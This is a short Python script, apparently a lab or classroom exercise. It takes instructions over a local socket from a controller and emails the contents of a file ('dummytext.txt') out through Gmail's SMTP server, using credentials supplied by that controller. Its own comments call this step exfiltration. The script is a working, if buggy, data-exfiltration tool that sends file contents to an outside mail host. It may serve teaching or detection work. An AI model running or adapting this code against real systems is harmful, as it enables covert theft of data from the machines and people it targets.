#!/usr/bin/env python3

import socket
import smtplib, ssl

SSLport = 465
message = ""
smtp_server = "smtp.gmail.com"

HOST = '127.0.0.1'
PORT = 12001

ACK = 'acknowledged'


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.connect((HOST, PORT))
    #receive the details from the server and assign it to the variable message
    message = receiveText(sock)
    #split the string into an array called details
    details = message.split()
    #send parts of the array to the exfiltration function, first element is the recipient email, 2nd is the sender email, and 3rd is the sender email password
    SMTPexfiltration(details[0], details[1], details[2])

def SMTPexfiltration(receiver_email, sender_email, password):
    file = open("dummytext.txt","r")
	
    with open("dummytext.txt") as f:
        for line in f:
            exfiltrationMessage = message + line
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, SSLport, context = context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, exfiltrationMessage)
    print("data exfiltration")
    
	

def receiveText(sock):
    #Get exfiltration details from server
    encodedMessage = sock.recv(1024)

    #Print an error message if it was not successful
    if not encodedMessage:
        print('error: encodedMessage was received as None')
        return None

    #Decode the exfiltration details
    message = encodedMessage.decode('utf-8')

    #encode ACK
    encodedAckText = bytes(ACK, 'utf-8')
    #Send ACK
    sock.sendall(encodedAckText)

    return message

main()